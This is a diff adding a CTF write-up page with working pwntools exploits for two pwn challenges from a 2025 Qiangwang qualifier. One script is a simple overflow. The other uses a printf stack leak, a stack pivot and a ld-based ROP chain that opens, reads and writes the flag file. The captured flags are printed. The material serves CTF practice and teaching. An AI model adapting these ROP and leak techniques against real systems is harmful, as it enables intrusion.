@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="babystack Information - Category: Pwn - Points: 500 Description 拿到属于你的 shell 吧 Get your own shell Write-up ？ Exploit Flag :spoiler[flag{W528uZdUsvWbiWxqon5YLvZa8x6uo8IP}] stack Information - Category: Pwn - Points: 500 Description 我不需要 lib..."><meta name="robots" content="index,follow"><link rel="canonical" href="https://www.cubeyond.net/volume/1/2025-%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"><link rel="alternate" type="application/rss+xml" title="Entropic RSS" href="https://www.cubeyond.net/rss.xml"><meta property="og:site_name" content="Entropic"><meta property="og:title" content="Write-ups: 第八届「强网」拟态防御国际精英挑战赛-线上预选赛 :: Entropic"><meta property="og:description" content="babystack Information - Category: Pwn - Points: 500 Description 拿到属于你的 shell 吧 Get your own shell Write-up ？ Exploit Flag :spoiler[flag{W528uZdUsvWbiWxqon5YLvZa8x6uo8IP}] stack Information - Category: Pwn - Points: 500 Description 我不需要 lib..."><meta property="og:type" content="article"><meta property="og:url" content="https://www.cubeyond.net/volume/1/2025-%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Write-ups: 第八届「强网」拟态防御国际精英挑战赛-线上预选赛 :: Entropic"><meta name="twitter:description" content="babystack Information - Category: Pwn - Points: 500 Description 拿到属于你的 shell 吧 Get your own shell Write-up ？ Exploit Flag :spoiler[flag{W528uZdUsvWbiWxqon5YLvZa8x6uo8IP}] stack Information - Category: Pwn - Points: 500 Description 我不需要 lib..."><meta property="article:published_time" content="2025-10-25T00:00:00.000Z"><link rel="stylesheet" href="/_astro/global.CMXalTX5.css"><style>@font-face {
+  font-family: gohu;
+  src: url("/fonts/gohu-subset.woff") format("woff");
+  font-display: block;
+  font-style: normal;
+  font-weight: 400;
+}
+:root {
+  --bg: #0c0d10;
+  --home-bg: #0a0b11;
+  --fg: #fefefe;
+  --link: #93ffd7;
+  --link-hover: #c7ffe9;
+  --link-hover-bg: #153329;
+  --particle-home: #b47ae2;
+  --particle-home-glow: #6f4b97;
+  --particle-page: #9368b8;
+  --particle-page-glow: #52376f;
+  --particle-volume: #a878d2;
+  --particle-volume-glow: #68448c;
+  --text-font: gohu;
+  --text-size: 14px;
+  --cjk-size: 13px;
+  --cjk-link-size: 15px;
+  --text-cell: 8px;
+  --home-size: 14px;
+}</style><link rel="preload" href="/fonts/gohu-subset.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/assets/cjk/wqy-cjk-body.png" as="image"><link rel="preload" href="/assets/cjk/wqy-cjk-link.png" as="image"><title>Entropic</title></head> <body data-mobile-fit-breakpoint="760" data-particles-enabled="true">  <main class="screen">  <article class="textmode-wrap phile-wrap"> <header class="phile-header" style="--phile-header-lines: 17; --phile-meta-lines: 3; --phile-title-lines: 2"> <pre class="textmode-pre phile-pre phile-header-side life-art" data-life-root><span data-life-line data-row="0">┌───────────────────────┐</span>
+<span data-life-line data-row="1">│                       │</span>
+<span data-life-line data-row="2">│                       │</span>
+<span data-life-line data-row="3">│                       │</span>
+<span data-life-line data-row="4">│                       │</span>
+<span data-life-line data-row="5">│                       │</span>
+<span data-life-line data-row="6">│                       │</span>
+<span data-life-line data-row="7">│                       │</span>
+<span data-life-line data-row="8">│                       │</span>
+<span data-life-line data-row="9">│                       │</span>
+<span data-life-line data-row="10">│                       │</span>
+<span data-life-line data-row="11">│                       │</span>
+<span data-life-line data-row="12">│                       │</span>
+<span data-life-line data-row="13">│                       │</span>
+<span data-life-line data-row="14">│                       │</span>
+<span data-life-line data-row="15">│                       │</span>
+<span data-life-line data-row="16">└───────────────────────┘</span></pre> <pre class="textmode-pre phile-pre phile-header-meta">Write-ups:
+<span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-672px">第</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-80px">八</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-288px">届</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:0px">「</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-320px">强</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-720px">网</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:0px">」</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-400px">拟</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-336px">态</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-912px">防</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-336px">御</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-208px">国</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-912px">际</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-688px">精</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-752px">英</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-400px">挑</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-368px">战</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-832px">赛</span>-<span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-704px">线</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:0px">上</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-928px">预</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-864px">选</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-832px">赛</span>
+~ CuB3y0nd</pre> </header> <pre class="textmode-pre phile-pre phile-body-pre"># babystack
+
+## Information
+
+- Category: Pwn
+- Points: 500
+
+## Description
+
+&gt; <span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-400px">拿</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-288px">属</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-64px">你</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span> shell <span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-176px">吧</span>&lt;br/&gt;
+&gt; Get your own shell
+
+## Write-up
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-976px">？</span>
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ELF,
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = &quot;./babystack&quot;
+HOST, PORT = &quot;pwn-10ba42cde6.challenge.xctf.org.cn&quot;, 9999
+
+context(log_level=&quot;debug&quot;, binary=FILE, terminal=&quot;kitty&quot;)
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    payload = flat(
+        b&quot;A&quot; * 24,
+    )
+    target.sendafter(b&quot;flag1:&quot;, payload)
+    payload = flat(
+        b&quot;B&quot; * 0xF8,
+        0x1337ABC,
+    )
+    raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;flag2:&quot;, payload)
+
+    target.interactive()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+```
+
+## Flag
+
+:spoiler[`flag{W528uZdUsvWbiWxqon5YLvZa8x6uo8IP}`]
+
+# stack
+
+## Information
+
+- Category: Pwn
+- Points: 500
+
+## Description
+
+&gt; <span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-928px">需</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span> libc<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-608px">猜</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-64px">你</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-16px">也</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-928px">需</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span>&lt;br/&gt;
+&gt; I don't need libc, and I guess you don't need it either
+
+## Write-up
+
+~~<span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:0px">「</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-800px">讨</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-240px">好</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:0px">」</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-192px">哦</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:0px">「</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-864px">迎</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-160px">合</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:0px">」</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-864px">迎</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-160px">合</span> description<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span> ld……~~
+
+`printf` <span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-64px">使</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span> rbp <span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-256px">定</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-48px">位</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-528px">泄</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-560px">漏</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-496px">栈</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-208px">址</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-176px">和</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-96px">其</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-256px">它</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-48px">任</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-368px">意</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-208px">址</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+```asm showLineNumbers=false {26-27}
+; Attributes: bp-based frame
+
+; int sub_401354()
+sub_401354 proc near
+
+s= byte ptr -10h
+
+; __unwind {
+endbr64
+push    rbp
+mov     rbp, rsp
+sub     rsp, 10h
+lea     rax, [rbp+s]
+mov     edx, 10h        ; n
+mov     esi, 0          ; c
+mov     rdi, rax        ; s
+call    _memset
+lea     rax, aCouldYouTellMe ; &quot;Could you tell me your name?&quot;
+mov     rdi, rax        ; s
+call    _puts
+lea     rax, [rbp+s]
+mov     edx, 18h        ; nbytes
+mov     rsi, rax        ; buf
+mov     edi, 0          ; fd
+call    _read
+lea     rax, [rbp+s]
+mov     rsi, rax
+lea     rax, format     ; &quot;Hello, %s!n&quot;
+mov     rdi, rax        ; format
+mov     eax, 0
+call    _printf
+nop
+leave
+retn
+; } // starts at 401354
+sub_401354 endp
+```
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ELF,
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = &quot;./pwn_patched&quot;
+HOST, PORT = &quot;pwn-2229eb847f.challenge.xctf.org.cn&quot;, 9999
+
+context(log_level=&quot;debug&quot;, binary=FILE, terminal=&quot;kitty&quot;)
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendafter(b&quot;name?&quot;, b&quot;A&quot; * 0x10)
+    target.recvuntil(b&quot;A&quot; * 0x10)
+    stack = int.from_bytes(target.recv(0x6), &quot;little&quot;)
+    ld = stack + 0xC0
+    ret = stack + 0x20
+    target.success(f&quot;stack: {hex(stack)}&quot;)
+
+    payload = flat(
+        b&quot;A&quot; * 0x60,
+        ret + 0x60,
+        0x4013D4,  # read
+    )
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendafter(b&quot;Any thing else?&quot;, payload)
+
+    payload = flat(
+        0x401413,  # main
+        b&quot;A&quot; * 0x58,
+        ld + 0x10,
+        0x40139B,  # printf
+    )
+    target.sendline(payload)
+    target.recvuntil(b&quot;Hello, &quot;)
+    leaked_ld = int.from_bytes(target.recv(0x6), &quot;little&quot;) - 0x3B2E0
+    target.success(f&quot;libc: {hex(leaked_ld)}&quot;)
+
+    target.sendlineafter(b&quot;name?&quot;, b&quot;&quot;)
+
+    flag = stack - 0xA0
+    payload = flat(
+        b&quot;./flagx00x00&quot;,
+        b&quot;A&quot; * 0x60,
+        # openat
+        leaked_ld + 0x25E6B,  # pop rdi; ret
+        -100,
+        leaked_ld + 0x54DA,  # pop rsi; ret
+        flag,
+        leaked_ld + 0x20322,  # pop rax; pop rdx; pop rbx; ret
+        0x101,
+        0,
+        0,
+        leaked_ld + 0x16629,  # syscall; ret
+        # read
+        leaked_ld + 0x25E6B,  # pop rdi; ret
+        0x3,
+        leaked_ld + 0x54DA,  # pop rsi; ret
+        elf.bss() + 0x500,
+        leaked_ld + 0x20322,  # pop rax; pop rdx; pop rbx; ret
+        0,
+        0x1337,
+        0,
+        leaked_ld + 0x16629,  # syscall; ret
+        # write
+        leaked_ld + 0x25E6B,  # pop rdi; ret
+        0x1,
+        leaked_ld + 0x54DA,  # pop rsi; ret
+        elf.bss() + 0x500,
+        leaked_ld + 0x20322,  # pop rax; pop rdx; pop rbx; ret
+        1,
+        0x1337,
+        0,
+        leaked_ld + 0x16629,  # syscall; ret
+    )
+    raw_input(&quot;DEBUG&quot;)
+    target.sendafter(b&quot;Any thing else?&quot;, payload)
+
+    target.interactive()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+```
+
+## Flag
+
+:spoiler[`flag{nfRlSH0ll0o4j4kd05IA6NJWtO8DYYSk}`]
+</pre> <pre class="textmode-pre phile-pre phile-footer-pre">
+
+ret <a href="/volume/1/">&lt;volume_1&gt;</a>
+</pre> </article> <script type="module" src="/_astro/PhileShell.astro_astro_type_script_index_0_lang.CtuB20jf.js"></script>   </main>  <vercel-analytics data-props="{}" data-params="{&quot;volume&quot;:&quot;1&quot;,&quot;slug&quot;:&quot;2025-第八届强网拟态&quot;}" data-pathname="/volume/1/2025-%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"></vercel-analytics> <script type="module">var v=()=>{window.va||(window.va=function(...i){window.vaq||(window.vaq=[]),window.vaq.push(i)})},w="@vercel/analytics",h="2.0.1";function f(){return typeof window<"u"}function l(){try{const e="production"}catch{}return"production"}function m(e="auto"){if(e==="auto"){window.vam=l();return}window.vam=e}function y(){return(f()?window.vam:l())||"production"}function d(){return y()==="development"}function b(e,i){if(!e||!i)return e;let n=e;try{const t=Object.entries(i);for(const[r,s]of t)if(!Array.isArray(s)){const o=u(s);o.test(n)&&(n=n.replace(o,`/[${r}]`))}for(const[r,s]of t)if(Array.isArray(s)){const o=u(s.join("/"));o.test(n)&&(n=n.replace(o,`/[...${r}]`))}return n}catch{return e}}function u(e){return new RegExp(`/${g(e)}(?=[/?#]|$)`)}function g(e){return e.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function E(e){return e.scriptSrc?a(e.scriptSrc):d()?"https://va.vercel-scripts.com/v1/script.debug.js":e.basePath?a(`${e.basePath}/insights/script.js`):"/_vercel/insights/script.js"}function k(e,i){var n;let t=e;if(i)try{t={...(n=JSON.parse(i))==null?void 0:n.analytics,...e}}catch{}m(t.mode);const r={sdkn:w+(t.framework?`/${t.framework}`:""),sdkv:h};return t.disableAutoTrack&&(r.disableAutoTrack="1"),t.viewEndpoint&&(r.viewEndpoint=a(t.viewEndpoint)),t.eventEndpoint&&(r.eventEndpoint=a(t.eventEndpoint)),t.sessionEndpoint&&(r.sessionEndpoint=a(t.sessionEndpoint)),d()&&t.debug===!1&&(r.debug="false"),t.dsn&&(r.dsn=t.dsn),t.endpoint?r.endpoint=t.endpoint:t.basePath&&(r.endpoint=a(`${t.basePath}/insights`)),{beforeSend:t.beforeSend,src:E(t),dataset:r}}function a(e){return e.startsWith("http://")||e.startsWith("https://")||e.startsWith("/")?e:`/${e}`}function S(e={debug:!0},i){var n;if(!f())return;const{beforeSend:t,src:r,dataset:s}=k(e,i);if(v(),t&&((n=window.va)==null||n.call(window,"beforeSend",t)),document.head.querySelector(`script[src*="${r}"]`))return;const o=document.createElement("script");o.src=r;for(const[c,p]of Object.entries(s))o.dataset[c]=p;o.defer=!0,o.onerror=()=>{const c=d()?"Please check if any ad blockers are enabled and try again.":"Be sure to enable Web Analytics for your project and deploy again. See https://vercel.com/docs/analytics/quickstart for more information.";console.log(`[Vercel Web Analytics] Failed to load script from ${r}. ${c}`)},document.head.appendChild(o)}function $({route:e,path:i}){var n;(n=window.va)==null||n.call(window,"pageview",{route:e,path:i})}function A(){try{return}catch{}}function j(){try{return}catch{}}customElements.define("vercel-analytics",class extends HTMLElement{constructor(){super();try{const i=JSON.parse(this.dataset.props??"{}"),n=JSON.parse(this.dataset.params??"{}");S({...i,disableAutoTrack:!0,framework:"astro",basePath:A(),beforeSend:window.webAnalyticsBeforeSend},j());const t=this.dataset.pathname;$({route:b(t??"",n),path:t})}catch(i){throw new Error(`Failed to parse WebAnalytics properties: ${i}`)}}});</script> <script type="module" src="/_astro/BaseLayout.astro_astro_type_script_index_0_lang.GD05J9Fp.js"></script> </body> </html>
